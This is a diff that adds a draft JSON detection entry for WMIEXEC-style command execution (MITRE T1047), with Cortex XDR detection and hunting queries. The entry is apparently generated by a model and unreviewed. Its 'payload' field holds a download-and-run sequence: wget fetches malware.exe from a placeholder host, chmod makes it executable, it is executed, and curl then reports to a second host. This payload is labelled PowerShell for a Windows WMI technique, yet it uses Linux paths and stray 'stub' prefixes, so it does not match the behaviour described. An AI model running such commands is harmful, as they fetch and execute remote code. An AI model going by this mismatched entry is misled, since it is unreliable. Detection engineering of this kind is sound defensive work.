@@ -1,0 +1,152 @@
+{
+  "id": "TTP-0000-0019",
+  "schema_version": "1.0.0",
+  "entry_version": "0.1.0",
+  "status": "draft",
+  "metadata": {
+    "created_at": "2026-11-12T00:00:00Z",
+    "updated_at": "2026-11-12T00:00:00Z",
+    "authors": [
+      {
+        "name": "detdev pipeline (local model, unreviewed)",
+        "role": "generator"
+      }
+    ],
+    "tags": [
+      "generated-draft",
+      "platform-windows",
+      "endpoint",
+      "cortex-analytics-alert"
+    ],
+    "pov_engine": {
+      "auto_load": false,
+      "simulation_class": "endpoint",
+      "destructive": false,
+      "platforms": [
+        "windows"
+      ],
+      "cleanup_required": true,
+      "safety_class": "lab-only"
+    }
+  },
+  "identity": {
+    "name": "WMIEXEC-style Command Execution via WMI",
+    "summary": "An attacker uses WMI to execute a remote command, spawning cmd.exe under WmiPrvSE with output redirected to ADMIN$. Cortex should detect this behavior as a wmiexec-style command execution.",
+    "description": "An attacker uses WMI to execute a remote command, spawning cmd.exe under WmiPrvSE with output redirected to ADMIN$. Cortex should detect this behavior as a wmiexec-style command execution."
+  },
+  "mitre_attack": {
+    "matrix": "enterprise",
+    "techniques": [
+      {
+        "technique_id": "T1047",
+        "name": "Windows Management Instrumentation",
+        "tactic_ids": [
+          "TA0002"
+        ],
+        "tactic_names": [
+          "Execution"
+        ]
+      }
+    ]
+  },
+  "execution": {
+    "target_platform": "windows",
+    "execution_framework": "custom-cortex",
+    "privilege_required": "administrator",
+    "payload": {
+      "interpreter": "powershell",
+      "code": "wget http://192.0.2.50/malware.exe -O /tmp/malware.exe\nstub chmod +x /tmp/malware.exe\nstub /tmp/malware.exe\nstub curl -X POST http://192.0.2.100:8080/report -d 'status=executed'\n",
+      "input_variables": [],
+      "timeout_seconds": 120
+    },
+    "expected_artifacts": [
+      {
+        "artifact_type": "process",
+        "description": "cmd.exe spawned under WmiPrvSE",
+        "expected_value": "actor_process_image_name = 'WmiPrvSE.exe' and action_process_image_name = 'cmd.exe'"
+      },
+      {
+        "artifact_type": "network-connection",
+        "description": "Connection to ADMIN$ share",
+        "expected_value": "action_remote_ip = '192.0.2.1' and dst_port = 445"
+      }
+    ],
+    "cleanup": {
+      "manual_steps": [
+        "Not authored. Write and test cleanup before promotion."
+      ]
+    }
+  },
+  "detections": {
+    "biocs": [
+      {
+        "name": "WMI Command Execution",
+        "description": "Detection of cmd.exe execution under WmiPrvSE process",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter actor_process_image_name = 'WmiPrvSE.exe' and action_process_image_name = 'cmd.exe'",
+        "mitre_technique_ids": [
+          "T1047"
+        ],
+        "severity": "high",
+        "suppression_window_seconds": 0
+      }
+    ],
+    "abiocs": [
+      {
+        "name": "Command Execution via WMI",
+        "description": "Behavioral deviation of cmd.exe process spawning under WmiPrvSE with ADMIN$ redirection",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter actor_process_image_name = 'WmiPrvSE.exe' and action_process_image_name = 'cmd.exe'\n| filter action_file_path contains 'ADMIN$'",
+        "behavioral_profile": "machine-learning",
+        "causality_anchor": "WmiPrvSE process spawning cmd.exe",
+        "mitre_technique_ids": [
+          "T1047"
+        ],
+        "severity": "high"
+      }
+    ],
+    "xql_queries": [
+      {
+        "purpose": "validation",
+        "name": "WMI Command Execution Hunt",
+        "query": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter actor_process_image_name = 'WmiPrvSE.exe' and action_process_image_name = 'cmd.exe'\n| filter action_file_path contains 'ADMIN$'",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      }
+    ],
+    "correlation_rules": [],
+    "iocs": [],
+    "analytics_modules": [
+      "Cortex XSIAM Analytics (XDR Agent) — Command execution via wmiexec; Required Data: XDR Agent; ATT&CK T1047. Ref: cortex-docs.paloaltonetworks.com/analytics-alerts."
+    ]
+  },
+  "panw_mapping": {
+    "products": [
+      {
+        "module": "cortex-xdr",
+        "submodule": "analytics",
+        "coverage_tier": "detection"
+      }
+    ]
+  },
+  "references": [
+    {
+      "title": "Cortex XDR Analytics Alert Reference: Command execution via wmiexec",
+      "url": "https://cortex-docs.paloaltonetworks.com/analytics-alerts/alerts-by-name/command-execution-via-wmiexec",
+      "publisher": "Palo Alto Networks",
+      "primary": true
+    },
+    {
+      "title": "MITRE ATT&CK T1047",
+      "url": "https://attack.mitre.org/techniques/T1047/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    }
+  ],
+  "changelog": [
+    {
+      "entry_version": "0.1.0",
+      "date": "2026-11-12",
+      "author": "detdev pipeline (local model, unreviewed)",
+      "change": "Generated draft. Built from the model fragment and its recorded source only; not reviewed, not run."
+    }
+  ]
+}
